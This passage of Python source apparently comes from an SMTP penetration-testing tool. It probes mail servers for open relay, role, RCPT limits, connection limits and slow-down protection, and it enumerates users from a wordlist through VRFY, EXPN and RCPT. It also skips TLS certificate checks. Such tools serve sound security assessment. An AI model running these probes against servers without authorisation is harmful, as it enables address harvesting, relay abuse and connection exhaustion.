                plaintext_ok=True, starttls_ok=False, tls_ok=False
            )
        self.ptprint("Encryption", Out.INFO)
        self._stream_encryption_result()

        # 3. Open relay (always in run-all; use defaults if mail_from/rcpt_to not set)
        self.ptprint("Open relay", Out.INFO)
        try:
            mail_from = self.args.mail_from or f"relaytest@{self.fqdn}"
            rcpt_to = self.args.rcpt_to or "relaytest@external.relaytest.local"
            self.results.open_relay = self.open_relay_test(smtp, "TEST", mail_from, rcpt_to)
        except TestFailedError as e:
            self.results.open_relay_error = str(e)
        except Exception as e:
            self.results.open_relay_error = str(e)
        self._stream_open_relay_result()

        # 3b. HELO/EHLO hostname validation
        self.ptprint("HELO/EHLO hostname validation", Out.INFO)
        try:
            self.results.helo_validation = self.test_helo_validation()
        except TestFailedError as e:
            self.results.helo_validation_error = str(e)
        except Exception as e:
            self.results.helo_validation_error = str(e)
        self._stream_helo_validation_result()

        # 3c. AUTH downgrade
        self.ptprint("Authentication Downgrade", Out.INFO)
        try:
            self.results.auth_downgrade = self.test_auth_downgrade()
        except TestFailedError as e:
            self.results.auth_downgrade_error = str(e)
        except Exception as e:
            self.results.auth_downgrade_error = str(e)
        self._stream_auth_downgrade_result()

        # 4. Blacklist (domain + public IP; private IP skipped)
        self.ptprint("Blacklist information", Out.INFO)
        try:
            bl_result, skipped_private = self.test_blacklist(self.target)
            if skipped_private:
                self.results.blacklist_private_ip_skipped = True
            elif bl_result is not None:
                self.results.blacklist = bl_result
        except TestFailedError as e:
            self.results.blacklist_error = str(e)
        except Exception as e:
            self.results.blacklist_error = str(e)
        self._stream_blacklist_result()

        # 5. SPF (only if domain)
        self.ptprint("SPF records", Out.INFO)
        if self.target_is_ip:
            self.results.spf_requires_domain = True
        else:
            try:
                self.results.spf_records = self._get_nameservers(self.target)
            except TestFailedError as e:
                self.results.spf_error = str(e)
            except Exception as e:
                self.results.spf_error = str(e)
        self._stream_spf_result()

        # 6. User Enumeration & Catch All mailbox
        self.ptprint("User Enumeration & Catch All mailbox", Out.INFO)
        save_enum = self.args.enumerate
        try:
            self.args.enumerate = "ALL"
            smtp_enum = self.get_smtp_handler()
            smtp_enum.docmd("EHLO", self.fqdn)
            try:
                self.results.catch_all = self.test_catchall(smtp_enum)
            except Exception:
                self.results.catch_all = "indeterminate"
            self.results.enum_results = self.enumeration(smtp_enum)
        except TestFailedError as e:
            self.results.enum_error = str(e)
        except Exception as e:
            self.results.enum_error = str(e)
        finally:
            self.args.enumerate = save_enum
        self._stream_enumeration_result()

        # 6c. RCPT TO limit (per message)
        self.ptprint("RCPT TO limit", Out.INFO)
        try:
            smtp_rc = self.get_smtp_handler()
            smtp_rc.docmd("EHLO", self.fqdn)
            self.results.rcpt_limit = self.test_rcpt_limit(smtp_rc)
        except TestFailedError as e:
            self.results.rcpt_limit_error = str(e)
        except Exception as e:
            self.results.rcpt_limit_error = str(e)
        self._stream_rcpt_limit_result()

        # 7. NTLM
        self.ptprint("NTLM information", Out.INFO)
        try:
            self.results.ntlm = self.auth_ntlm(smtp)
        except TestFailedError as e:
            self.results.ntlm_error = str(e)
        except Exception as e:
            self.results.ntlm_error = str(e)
        self._stream_ntlm_result()

    def connect(self) -> tuple[smtplib.SMTP | smtplib.SMTP_SSL, int, bytes]:
        """Port 465 is implicit TLS only (SMTPS), so we use TLS even without --tls.
        For IP targets we connect manually with server_hostname=None so SNI does not break."""
        try:
            if self.args.tls or self.args.target.port == 465:
                ctx = ssl._create_unverified_context()
                host, port = self.args.target.ip, self.args.target.port
                try:
                    ipaddress.ip_address(host)
                    server_hostname = None
                except ValueError:
                    server_hostname = host
                sock = socket.create_connection((host, port), timeout=15.0)
                sock_ssl = ctx.wrap_socket(sock, server_hostname=server_hostname)
                smtp = smtplib.SMTP(timeout=15.0)
                smtp.sock = sock_ssl
                smtp.file = None
                status, reply = smtp.getreply()
            else:
                smtp = smtplib.SMTP(timeout=15.0)
                status, reply = smtp.connect(self.args.target.ip, self.args.target.port)
                if self.args.starttls and status == 220:
                    status_stls, _ = smtp.docmd("STARTTLS")
                    if status_stls == 220:
                        ctx = ssl._create_unverified_context()
                        try:
                            _is_ip = ipaddress.ip_address(self.args.target.ip)
                            server_hostname = None
                        except ValueError:
                            server_hostname = self.args.target.ip
                        sock_ssl = ctx.wrap_socket(smtp.sock, server_hostname=server_hostname)
                        smtp.sock = sock_ssl
                        smtp.file = None
                        smtp.helo_resp = None
                        smtp.ehlo_resp = None
                        smtp.esmtp_features = {}
                        smtp.does_esmtp = False

            return smtp, status, reply
        except Exception as e:
            mode = "TLS" if (self.args.tls or self.args.target.port == 465) else get_mode(self.args)
            msg = (
                f"Could not connect to the target server "
                f"{self.args.target.ip}:{self.args.target.port} ({mode}): {e}"
            )
            if self.args.target.port == 587 and not self.args.starttls and "refused" in str(e).lower():
                msg += " (port 587 typically requires --starttls)"
            self._fail(msg)

    def get_smtp_handler(self) -> smtplib.SMTP:
        smtp_handler, status, reply = self.connect()
        if status == 220:
            return smtp_handler
        else:
            self.ptjsonlib.end_error(
                f"SMTP Info - [{status}] {self.bytes_to_str(reply)}", self.use_json
            )
            raise SystemExit

    def _get_smtp_connection(self):
        smtp, status, reply = self.connect()

        if status == 220:
            status, reply = smtp.docmd("EHLO", f"{self.fqdn}")
            if status == 250:
                return smtp
            else:
                raise Exception("Error when EHLOing")
        else:
            # Include actual server response (e.g. 421 = too many connections, try later)
            raise Exception(f"Server responded {status}: {self.bytes_to_str(reply)}")

    def wait_for_unban(self, seconds, ban_duration=0, retries_left=12):
        """Wait for server to unban, then try to reconnect. Returns (ban_minutes, reconnected)."""
        self.noop_smtp_connections()
        ban_duration += seconds
        time.sleep(seconds)
        try:
            self.ptdebug(f">", end="")
            self._get_smtp_connection()
            self.ptdebug(f"\r", end="")
            return (ban_duration / 60, True)
        except Exception as e:
            if retries_left <= 0:
                return (ban_duration / 60, False)
            return self.wait_for_unban(5, ban_duration, retries_left - 1)

    def noop_smtp_connections(self):
        for smtp in self.smtp_list:
            status, reply = smtp.docmd("noop")
            if status != 250:
                return True
        return False

    def close_smtp_connections(
        self,
    ):
        for smtp in self.smtp_list:
            try:
                smtp.quit()
            except Exception:
                continue
        del self.smtp_list

    def max_connections_test(self) -> MaxConnectionsResult:
        self.smtp_list = []
        allowed_connections = None
        is_disconnect = False
        ban_duration = None
        ban_reconnected = True

        self.ptdebug(f"Max smtp connections test", title=True)
        start_time = time.time()
        self.ptdebug(f"", Out.INFO, end="")
        for index, i in enumerate(range(100)):
            try:
                self.ptdebug(f">", end="")
                self.smtp_list.append(self._get_smtp_connection())
                if self.noop_smtp_connections() and not is_disconnect:
                    is_disconnect = time.time() - start_time
            except Exception as e:
                allowed_connections = len(self.smtp_list)
                self.ptdebug(f"\r", end="")
                self.ptdebug(
                    f"Maximum number of estabilished connections: {allowed_connections} {' '*(allowed_connections-35)}",
                    Out.INFO,
                )
                if index == 0:
                    self._fail(f"Could not retrieve initial smtp connection - {e}")
                self.smtp_list.pop()
                try:
                    self.smtp_list.append(self._get_smtp_connection())
                except Exception as e:
                    self.ptdebug(f"You're banned, reconnecting in 60 seconds ...", Out.INFO)
                    self.ptdebug(f"", Out.INFO, end="")
                    ban_duration, ban_reconnected = self.wait_for_unban(60)
                    if not ban_reconnected:
                        self.ptdebug(
                            f"Could not reconnect after ban (max retries exceeded)",
                            Out.INFO,
                        )
                break

        # close all smtp connections and delete *self.smtp_list*
        self.close_smtp_connections()

        if is_disconnect:
            self.ptdebug(
                f"Refreshed connection is disconnected after: {round(is_disconnect)} seconds",
                Out.INFO,
            )
        if ban_duration:
            if ban_reconnected:
                self.ptdebug(f"Unblocked after {ban_duration} minutes", Out.INFO)
        else:
            self.ptdebug(f"Not banned", Out.INFO)

        return MaxConnectionsResult(allowed_connections, ban_duration)

    def open_relay_test(self, smtp, msg, mail_from, rcpt_to) -> bool:
        """OWASP/Nmap-style multi-vector open relay test. Tests: empty FROM, internal→external,
        external→external, literal IP sender. Returns True if any vector succeeds."""
        self.ptdebug(f"Open Relay Test:", title=True)
        ext_domain = "external.relaytest.local"
        host_domain = self.fqdn or "relaytest.local"
        target_ip = getattr(self.args.target, "ip", None) or "127.0.0.1"

        vectors: list[tuple[str, str, str]] = [
            ("MAIL FROM:<> (null sender)", "<>", f"relaytest@{ext_domain}"),
            (f"relaytest@{host_domain} -> external", f"relaytest@{host_domain}", f"relaytest@{ext_domain}"),
            (f"relaytest@[{target_ip}] -> external", f"relaytest@[{target_ip}]", f"relaytest@{ext_domain}"),
            ("external -> external", f"relaytest@{ext_domain}", f"relaytest@other.{ext_domain}"),
        ]

        if mail_from and rcpt_to:
            vectors.insert(0, (f"user: {mail_from} -> {rcpt_to}", mail_from, rcpt_to))

        for label, from_addr, to_addr in vectors:
            try:
                smtp.sendmail(from_addr, [to_addr], msg)
                self.ptdebug(f"Server is vulnerable to Open relay ({label})", Out.VULN)
                return True
            except smtplib.SMTPRecipientsRefused as e:
                self.ptdebug(f"Relay rejected: {label} - {e}", Out.INFO)
            except smtplib.SMTPResponseException as e:
                self.ptdebug(f"Relay rejected: {label} - {e.smtp_code} {e.smtp_error}", Out.INFO)
            except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError) as e:
                self.ptdebug(f"Relay rejected: {label} - {e}", Out.INFO)
            except Exception as e:
                self.ptdebug(f"Relay rejected: {label} - {e}", Out.INFO)
            try:
                smtp.docmd("RSET")
            except Exception:
                pass

        self.ptdebug("Server is not vulnerable to Open relay", Out.NOTVULN)
        return False

    # ------------------------------------------------------------------
    # Role identification (MTA / Submission / Hybrid)
    # ------------------------------------------------------------------

    @staticmethod
    def _ehlo_has_auth(ehlo_raw: str | None) -> tuple[bool, list[str]]:
        """Check if EHLO response advertises AUTH. Returns (found, [methods])."""
        if not ehlo_raw:
            return False, []
        methods: list[str] = []
        for line in ehlo_raw.replace("\r\n", "\n").replace("\r", "\n").split("\n"):
            line = line.strip()
            # Strip SMTP code prefix (250- or 250 )
            if line.startswith("250-"):
                rest = line[4:].strip()
            elif line.startswith("250 "):
                rest = line[3:].strip()
            else:
                rest = line.strip()
            if not rest:
                continue
            parts = rest.split(None, 1)
            key = (parts[0] or "").upper()
            if key == "AUTH":
                value = parts[1].strip() if len(parts) > 1 else ""
                methods.extend(m.upper() for m in value.split() if m)
        return (len(methods) > 0), methods

    def _role_port_hint(self) -> str:
        """Classify port as typical MTA or Submission."""
        port = self.args.target.port
        if port == 25:
            return "mta"
        if port in (587, 465, 2525):
            return "submission"
        return "unknown"

    def _role_rcpt_probe(self, smtp: smtplib.SMTP, target_domain: str | None) -> tuple[bool | None, str]:
        """Send MAIL FROM + RCPT TO without AUTH to determine if server requires authentication.

        Returns (auth_required, detail):
          True   -- server requires auth for RCPT TO (530)
          False  -- server accepts RCPT TO without auth (MTA or hybrid behaviour)
          None   -- could not determine (no domain, connection error, etc.)

        Guarantees: smtp handler is returned to a clean state (RSET) on all code
        paths so that subsequent tests (open_relay, enumeration, ...) can start
        a fresh MAIL transaction without 503 errors.
        """
        if not target_domain:
            # RFC 5321 s4.1.3: Address Literal -- server MUST accept mail for its own IP
            target_domain = f"[{self.target_ip}]"

        ext_domain = "gmail.com"
        local_rcpt = f"postmaster@{target_domain}"
        ext_rcpt = f"roletest@{ext_domain}"

        local_auth_required: bool | None = None
        local_detail = ""

        try:
            # Ensure clean state before probe
            try:
                smtp.docmd("RSET")
            except Exception:
                pass

            # 1. MAIL FROM
            try:
                status, reply = smtp.docmd("MAIL", f"FROM:<roletest@example.com>")
                self.ptdebug(f"Role probe MAIL FROM: {status} {self.bytes_to_str(reply)}", Out.INFO)
                if status not in (250, 251):
                    return None, f"MAIL FROM rejected: {status} {self.bytes_to_str(reply)}"
            except Exception as e:
                return None, f"MAIL FROM error: {e}"

            # 2. RCPT TO local domain
            try:
                status, reply = smtp.docmd("RCPT", f"TO:<{local_rcpt}>")
                reply_str = self.bytes_to_str(reply)
                self.ptdebug(f"Role probe RCPT TO (local) {local_rcpt}: {status} {reply_str}", Out.INFO)
                if status in (250, 251):
                    local_auth_required = False
                    local_detail = f"RCPT TO:<{local_rcpt}> accepted without auth ({status})"
                elif 530 <= status <= 535:
                    local_auth_required = True
                    local_detail = f"RCPT TO:<{local_rcpt}> requires authentication ({status})"
                elif status in (550, 551, 553):
                    local_auth_required = False
                    local_detail = f"RCPT TO:<{local_rcpt}> rejected user ({status}) but no auth required"
                elif status in (450, 451, 452):
                    local_auth_required = False
                    local_detail = f"RCPT TO:<{local_rcpt}> greylisting detected ({status}); no auth required"
                elif status == 421:
                    return None, f"Server closed connection ({status})"
                else:
                    local_detail = f"RCPT TO:<{local_rcpt}> unexpected response: {status} {reply_str}"
            except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError) as e:
                return None, f"Connection lost during RCPT TO probe: {e}"
            except Exception as e:
                return None, f"RCPT TO error: {e}"

            # 3. RCPT TO external domain (relay check, only if local was accepted)
            if local_auth_required is False:
                try:
                    smtp.docmd("RSET")
                    smtp.docmd("MAIL", "FROM:<roletest@example.com>")
                    status, reply = smtp.docmd("RCPT", f"TO:<{ext_rcpt}>")
                    reply_str = self.bytes_to_str(reply)
                    self.ptdebug(f"Role probe RCPT TO (ext) {ext_rcpt}: {status} {reply_str}", Out.INFO)
                    if status in (250, 251):
                        local_detail += f"; RCPT TO:<{ext_rcpt}> also accepted (possible open relay)"
                except Exception:
                    pass

            if local_auth_required is not None:
                return local_auth_required, local_detail
            return None, local_detail or "Could not determine auth requirement"

        finally:
            # Always reset MAIL transaction state so the smtp handler is clean
            # for any subsequent tests (open_relay, enumeration, bruteforce, ...).
            try:
                smtp.docmd("RSET")
            except Exception:
                pass

    def test_role(self, smtp: smtplib.SMTP, info: InfoResult) -> RoleResult:
        """Identify SMTP server role based on port, AUTH availability, and RCPT TO probe.

        Decision matrix:
          port_hint  | AUTH advertised | RCPT TO probe    | Result
          -----------|-----------------|------------------|------------
          mta (25)   | no              | (skip)           | MTA
          mta (25)   | yes             | auth required    | Submission (unusual port)
          mta (25)   | yes             | no auth required | Hybrid
          sub (587+) | yes             | (skip)           | Submission
          sub (587+) | no              | no auth required | MTA (unusual port)
          sub (587+) | no              | auth required    | Submission
          any        | indeterminate   | indeterminate    | Indeterminate
        """
        self.ptdebug("Role identification test", title=True)

        port_hint = self._role_port_hint()

        # Check AUTH in both EHLO (plain) and EHLO after STARTTLS
        auth_plain, methods_plain = self._ehlo_has_auth(info.ehlo)
        auth_starttls, methods_starttls = self._ehlo_has_auth(
            getattr(info, "ehlo_starttls", None)
        )
        auth_advertised = auth_plain or auth_starttls
        auth_methods = sorted(set(methods_plain + methods_starttls))

        target_domain = getattr(self.results, "resolved_domain", None)

        # --- High-confidence cases (no RCPT TO probe needed) ---

        # Port 25 + no AUTH -> pure MTA
        if port_hint == "mta" and not auth_advertised:
            detail = "Port 25, AUTH not advertised"
            return RoleResult("mta", port_hint, False, None, detail)

        # Submission port + AUTH present -> pure Submission (RFC 6409)
        if port_hint == "submission" and auth_advertised:
            methods_str = ", ".join(auth_methods) if auth_methods else "unknown"
            detail = f"Port {self.args.target.port}, AUTH advertised ({methods_str})"
            return RoleResult("submission", port_hint, True, None, detail)

        # --- Cases that need RCPT TO probe ---

        # Port 25 + AUTH present -> could be Hybrid or Submission on unusual port
        # Submission port + no AUTH -> could be MTA on unusual port or misconfigured Submission
        auth_required, probe_detail = self._role_rcpt_probe(smtp, target_domain)

        if port_hint == "mta" and auth_advertised:
            methods_str = ", ".join(auth_methods) if auth_methods else "unknown"
            if auth_required is True:
                detail = f"Port 25 but AUTH required for RCPT TO ({methods_str}); {probe_detail}"
                return RoleResult("submission", port_hint, True, True, detail)
            elif auth_required is False:
                detail = f"Port 25, AUTH advertised ({methods_str}) but RCPT TO accepted without auth; {probe_detail}"
                return RoleResult("hybrid", port_hint, True, False, detail)
            else:
                detail = f"Port 25, AUTH advertised ({methods_str}), probe inconclusive; {probe_detail}"
                return RoleResult("indeterminate", port_hint, True, None, detail)

        if port_hint == "submission" and not auth_advertised:
            if auth_required is True:
                detail = f"Port {self.args.target.port}, AUTH not in EHLO but required for RCPT TO; {probe_detail}"
                return RoleResult("submission", port_hint, False, True, detail)
            elif auth_required is False:
                detail = f"Port {self.args.target.port} (typical Submission) but no AUTH and RCPT TO accepted; {probe_detail}"
                return RoleResult("mta", port_hint, False, False, detail)
            else:
                detail = f"Port {self.args.target.port}, AUTH not in EHLO, probe inconclusive; {probe_detail}"
                return RoleResult("indeterminate", port_hint, False, None, detail)

        # Unknown port
        if auth_advertised:
            methods_str = ", ".join(auth_methods) if auth_methods else "unknown"
            if auth_required is True:
                detail = f"Port {self.args.target.port}, AUTH advertised ({methods_str}), required for RCPT TO; {probe_detail}"
                return RoleResult("submission", port_hint, True, True, detail)
            elif auth_required is False:
                detail = f"Port {self.args.target.port}, AUTH advertised ({methods_str}), RCPT TO accepted without auth; {probe_detail}"
                return RoleResult("hybrid", port_hint, True, False, detail)
            else:
                detail = f"Port {self.args.target.port}, AUTH advertised ({methods_str}), probe inconclusive; {probe_detail}"
                return RoleResult("indeterminate", port_hint, True, None, detail)
        else:
            if auth_required is False:
                detail = f"Port {self.args.target.port}, no AUTH, RCPT TO accepted without auth; {probe_detail}"
                return RoleResult("mta", port_hint, False, False, detail)
            elif auth_required is True:
                detail = f"Port {self.args.target.port}, no AUTH in EHLO but required for RCPT TO; {probe_detail}"
                return RoleResult("submission", port_hint, False, True, detail)
            else:
                detail = f"Port {self.args.target.port}, no AUTH, probe inconclusive; {probe_detail}"
                return RoleResult("indeterminate", port_hint, False, None, detail)

    @staticmethod
    def _to_parent_domain(host: str) -> str:
        """Reduce hostname to parent (second-level) domain: strip leftmost label if 3+ parts."""
        host = (host or "").strip().lower()
        if not host or "." not in host:
            return host
        parts = host.split(".")
        if len(parts) >= 3:
            return ".".join(parts[1:])
        return host

    def _get_rcpt_limit_domain(self) -> str:
        """Domain for RCPT TO limit test: -d/--domain, or from server banner/EHLO (via PSL), or fqdn, or test.com.
        User -d is used as-is. Domain from server: FQDN is resolved to registrable domain via Public Suffix List
        (e.g. relay01.prod.amazon.co.jp -> amazon.co.jp); fallback to full hostname or _to_parent_domain if PSL fails.
        """
        domain = getattr(self.args, "domain", None)
        if domain and domain.strip():
            return domain.strip()
        host: str | None = None
        info = getattr(self.results, "info", None)
        if info and getattr(info, "banner", None):
            line = (info.banner or "").replace("\r", "").split("\n")[0].strip()
            parts = line.split()
            if len(parts) >= 2 and parts[0] == "220":
                host = parts[1]
            elif parts:
                host = parts[0]
            if host and "." in host:
                psl_domain = _registrable_domain_psl(host)
                if psl_domain:
                    return psl_domain
                return host
        if info and getattr(info, "ehlo", None):
            raw = (info.ehlo or "").replace("\r\n", "\n").replace("\r", "\n")
            for line in raw.split("\n"):
                line = line.strip()
                if line.startswith("250-"):
                    rest = line[4:].strip()
                elif line.startswith("250 "):
                    rest = line[3:].strip()
                else:
                    continue
                if rest and "." in rest.split()[0]:
                    host = rest.split()[0]
                    psl_domain = _registrable_domain_psl(host)
                    if psl_domain:
                        return psl_domain
                    return host
        if self.fqdn and "." in self.fqdn and "pentereptools" not in self.fqdn.lower():
            psl_domain = _registrable_domain_psl(self.fqdn)
            if psl_domain:
                return psl_domain
            return self._to_parent_domain(self.fqdn)
        try:
            ptr_host = socket.gethostbyaddr(self.target_ip)[0]
            if ptr_host and "." in ptr_host:
                psl_domain = _registrable_domain_psl(ptr_host)
                if psl_domain:
                    return psl_domain
                return self._to_parent_domain(ptr_host) if len(ptr_host.split(".")) >= 3 else ptr_host
        except (socket.herror, socket.gaierror, socket.timeout, OSError):
            pass
        return "test.com"

    def _run_rcpt_limit_for_domain(self, smtp: smtplib.SMTP, domain: str) -> RcptLimitResult:
        """Run MAIL FROM + RCPT TO loop for a given domain. Used so we can retry with parent domain.
        Continues on 554/550/553/450 (policy rejection) to probe session error limit (smtpd_hard_error_limit).
        """
        max_try = 2000
        MAX_FAILED_PROBE = 50  # Probe limit for session error detection when all RCPTs get 554

        try:
            status, reply = smtp.docmd("MAIL FROM:", "<>")
            if status != 250:
                return RcptLimitResult(0, False, self.bytes_to_str(reply), False)
        except (smtplib.SMTPServerDisconnected, ConnectionResetError, BrokenPipeError, EOFError, OSError) as e:
            return RcptLimitResult(0, True, str(e), False)

        accepted = 0
        failed = 0
        limit_response: str | None = None
        first_policy_response: str | None = None  # First 554/550/553/450 for display

        for i in range(1, max_try + 1):
            try:
                status, reply = smtp.docmd("RCPT TO:", f"<{i}@{domain}>")
                reply_str = self.bytes_to_str(reply)
                if status == 250:
                    accepted += 1
                    continue
                limit_response = f"[{status}] {reply_str}".strip()
                if first_policy_response is None and status in (450, 550, 553, 554):
                    first_policy_response = limit_response

                # Policy rejection (relay/sender/recipient) – continue to probe session limit
                if status in (450, 550, 553, 554):
                    failed += 1
                    if accepted == 0 and failed >= MAX_FAILED_PROBE:
                        self.ptdebug(
                            f"Server allows {failed} failed RCPTs without disconnect (no smtpd_hard_error_limit)",
                            Out.VULN,
                        )
                        return RcptLimitResult(
                            0, False, first_policy_response, rejected_addresses=True,
                            failed_before_limit=failed, session_limit_triggered=False, no_session_limit=True,
                        )
                    continue

                # Session limit: 421 (rate limit / too many errors)
                if status == 421:
                    self.ptdebug(f"Server session limit after {i} attempts: {limit_response}", Out.INFO)
                    return RcptLimitResult(
                        accepted, True, limit_response, rejected_addresses=(accepted == 0),
                        failed_before_limit=i, session_limit_triggered=True, no_session_limit=False,
                    )

                # Per-message RCPT limit: 452 Too many recipients
                if status == 452:
                    self.ptdebug(f"Server per-message limit after {accepted} recipients: {limit_response}", Out.INFO)
                    return RcptLimitResult(accepted, True, limit_response, False)

                # Other 5xx
                if 500 <= status <= 599:
                    self.ptdebug(f"Server limit after {accepted} recipients: {limit_response}", Out.INFO)
                    return RcptLimitResult(accepted, True, limit_response, False)

                return RcptLimitResult(accepted, False, limit_response, False)
            except (smtplib.SMTPServerDisconnected, ConnectionResetError, BrokenPipeError, EOFError, OSError) as e:
                self.ptdebug(f"Server closed connection after {i} attempts", Out.INFO)
                return RcptLimitResult(
                    accepted, True, str(e), rejected_addresses=(accepted == 0),
                    failed_before_limit=i, session_limit_triggered=True, no_session_limit=False,
                )

        self.ptdebug(f"No limit observed up to {accepted} recipients", Out.VULN)
        return RcptLimitResult(accepted, False, None, False)

    def test_rcpt_limit(self, smtp: smtplib.SMTP) -> RcptLimitResult:
        """
        Test RCPT TO limit per message: send MAIL FROM then many RCPT TO
        until server rejects (452 Too many recipients, 421, 5xx) or closes.
        When domain is taken from server (banner/EHLO) and server rejects with 550/553,
        retry with parent domain (e.g. calm.festiveloft.net -> festiveloft.net).
        """
        self.ptdebug("RCPT TO limit test (per message)", title=True)
        domain = self._get_rcpt_limit_domain()
        try:
            result = self._run_rcpt_limit_for_domain(smtp, domain)
            domain_used = domain

            # If server rejected (e.g. "User unknown" for full hostname) and user did not set -d,
            # retry with parent domain so test can succeed (e.g. festiveloft.net accepts 1@, 2@, ...).
            # Skip retry when no_session_limit or session_limit_triggered – socket may be dead.
            if (
                getattr(result, "rejected_addresses", False)
                and not getattr(result, "no_session_limit", False)
                and not getattr(result, "session_limit_triggered", False)
                and not getattr(self.args, "domain", None)
                and domain.count(".") >= 2
            ):
                parent = self._to_parent_domain(domain)
                if parent != domain:
                    self.ptdebug(f"Retrying RCPT TO limit with parent domain: {parent}", Out.INFO)
                    try:
                        smtp.docmd("RSET")
                    except Exception:
                        pass
                    result = self._run_rcpt_limit_for_domain(smtp, parent)
                    domain_used = parent

            return RcptLimitResult(
                result.max_accepted,
                result.limit_triggered,
                result.server_response,
                getattr(result, "rejected_addresses", False),
                domain_used,
                getattr(result, "failed_before_limit", 0),
                getattr(result, "session_limit_triggered", False),
                getattr(result, "no_session_limit", False),
            )
        finally:
            try:
                smtp.close()
            except Exception:
                pass

    def start_interactive_mode(self, smtp: smtplib.SMTP):
        self.ptprint("\n", end="")
        while True:
            user_input = input("[*] INTERACTIVE MODE: ").upper()
            status, reply = smtp.docmd(user_input)
            if user_input in ("EXIT", "QUIT"):
                break
            if user_input == "HELP":
                self.ptprint(f"[{status}] " + self.bytes_to_str(reply))
            if not self.bytes_to_str(reply).endswith("\n"):
                self.ptprint(f"[{status}] " + self.bytes_to_str(reply))
                self.ptprint(f" ")
            else:
                self.ptprint(f"[{status}] " + self.bytes_to_str(reply).replace("\n", "\n      "))

    def expn_vrfy_slow_down_test(self, method: str, smtp):
        if sum(self.slow_down_results.values()) >= 1:
            self.ptdebug(f"New smtp handle required, initiating new smtp connection ...", Out.INFO)
            smtp = self.get_smtp_handler()
            smtp.docmd("EHLO", f"{self.fqdn}")

        self.ptdebug(f"[{method}] SLOW DOWN TEST {' '*6}", Out.INFO, end="\r")

        dummy_data = [
            "".join(random.choices("abcdefghijk", k=random.randint(1, 5))) for i in range(29)
        ]
        half = int(len(dummy_data) / 2)
        is_slow_down = False
        is_unstable_response = False  # OWASP: init to avoid NameError
        initial_time = 0
        last_request_time = 0
        first_half_time = 0
        second_half_time = 0
        for index, user in enumerate(dummy_data):
            endl = "\n" if index + 1 == len(dummy_data) else "\r"
            self.ptdebug(
                f"[{method}] SLOW DOWN TEST [{index+1}/{len(dummy_data)}]", Out.INFO, end=endl
            )
            start_time = time.time()
            try:
                smtp.docmd(method, user)
            except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError):
                return {method.lower(): True}

            end_time = time.time() - start_time

            last_request_time = end_time
            if index == 0:
                initial_time += end_time

            if index < half:
                first_half_time += end_time
            else:
                second_half_time += end_time

            if end_time >= 3:
                is_unstable_response = True
            if end_time >= 3 and is_unstable_response:
                self.ptdebug(f"[{method}] SLOW DOWN TEST [{index+1}/{index+1}]", Out.INFO)
                self.ptdebug(f"Unstable response (>3sec), break", Out.VULN)
                is_slow_down = True
                break

        if (second_half_time - first_half_time) > initial_time * 10:
            is_slow_down = True
        if is_slow_down:
            self.ptdebug(f"{method} Method have slow-down protection implemented", Out.NOTVULN)
        self.ptdebug(f"First request response time: {str(initial_time)[:8]}", Out.INFO)
        self.ptdebug(f"Last request response time:  {str(last_request_time)[:8]}", Out.INFO)

        return {method.lower(): is_slow_down}

    def rcpt_slow_down_test(self, smtp):
        if sum(self.slow_down_results.values()) >= 1:
            smtp = self.get_smtp_handler()
            smtp.docmd("EHLO", f"{self.fqdn}")

        self.ptdebug(f"[RCPT] SLOW DOWN TEST {' '*6}", Out.INFO, end="\r")
        status, reply = smtp.docmd("MAIL FROM:", "<mail@from.me>")
        domain = self._get_rcpt_limit_domain()

        dummy_data = [
            "".join(random.choices("abcdefghijk", k=random.randint(1, 5))) for i in range(20)
        ]
        half = int(len(dummy_data) / 2)
        time_data = []
        is_slow_down = False

        first_half_time = 0
        initial_time = 0
        second_half_time = 0
        last_request_time = 0

        is_unstable_response = False
        for index, user in enumerate(dummy_data):
            endl = "\n" if index + 1 == len(dummy_data) else "\r"
            self.ptdebug(f"[RCPT] SLOW DOWN TEST [{index+1}/{len(dummy_data)}]", Out.INFO, end=endl)
            start_time = time.time()
            status, reply = smtp.docmd("RCPT TO:", f"<{user}@{domain}>")
            end_time = time.time() - start_time

            last_request_time = end_time
            if index == 0:
                initial_time += end_time
            if index < half:
                first_half_time += end_time
            else:
                second_half_time += end_time

            if end_time >= 3:
                is_unstable_response = True
            if end_time >= 3 and is_unstable_response:
                is_slow_down = True
                break

        if (second_half_time - first_half_time) > initial_time * 10:
            is_slow_down = True
        if is_slow_down:
            self.ptdebug(f"[RCPT] Method have slow-down protection implemented", Out.NOTVULN)

        self.ptdebug(f"First request response time: {str(initial_time)[:8]}", Out.INFO)
        self.ptdebug(f"Last request response time:  {str(last_request_time)[:8]}", Out.INFO)

        return {"rcpt": is_slow_down}

    def expn_vrfy_enumeration(self, method, smtp) -> list[str]:
        enum_threads = getattr(self.args, "enum_threads", 1)
        ehlo = (self.results.info and self.results.info.ehlo) or ""
        supports_smtputf8 = "SMTPUTF8" in ehlo.upper()
        if getattr(self, "_wordlist_skipped", 0) > 0:
            self.ptdebug(
                f"Skipped {self._wordlist_skipped} invalid local parts from wordlist",
                Out.INFO,
            )
        self.ptdebug(f"Enumerating users:" + (f" ({enum_threads} threads)" if enum_threads > 1 else ""), Out.INFO)
        enumerated_users: list[str] = []
        total_aliases = 0 if method == "EXPN" else None

        def _skip_non_ascii_no_utf8(s: str) -> bool:
            return not supports_smtputf8 and any(ord(c) >= 128 for c in s)

        if enum_threads <= 1:
            if supports_smtputf8:
                smtp.command_encoding = "utf-8"
            for user in self.wordlist:
                if _skip_non_ascii_no_utf8(user):
                    continue
                try:
                    status, reply = smtp.docmd(method, user)
                except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError) as e:
                    self.ptdebug(
                        f"{method} enumeration interrupted (connection closed/reset): {e}",
                        Out.INFO,
                    )
                    try:
                        smtp = self.get_smtp_handler()
                        smtp.docmd("EHLO", f"{self.fqdn}")
                        if supports_smtputf8:
                            smtp.command_encoding = "utf-8"
                        status, reply = smtp.docmd(method, user)
                    except Exception:
                        break
                if status != 550:
                    user_email = re.findall(r"<(.*?)>", self.bytes_to_str(reply))
                    if user_email:
                        enumerated_users.extend(user_email)
                        self.ptdebug(user_email[0])
                    if method == "EXPN" and len(user_email) > 1:
                        for alias in user_email[1:]:
                            total_aliases += len(user_email[1:])
                            self.ptdebug(f"   {alias}", Out.ADDITIONS)
        else:
            user_queue: queue.Queue[str | None] = queue.Queue()
            for u in self.wordlist:
                if not _skip_non_ascii_no_utf8(u):
                    user_queue.put(u)
            for _ in range(enum_threads):
                user_queue.put(None)
            result_lock = threading.Lock()

            def worker() -> None:
                try:
                    conn = self.get_smtp_handler()
